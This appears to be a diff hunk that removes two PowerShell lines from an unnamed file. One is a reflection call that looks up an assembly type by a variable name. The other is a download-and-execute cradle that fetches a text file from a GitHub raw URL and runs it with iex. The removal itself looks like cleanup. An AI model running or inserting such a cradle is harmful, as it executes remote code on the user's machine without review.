@@ -1,2 +1,0 @@
-$win = [Ref].Assembly.GetType($var1)
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/deverisc/arithmetic/refs/heads/main/arithmetic004.txt')
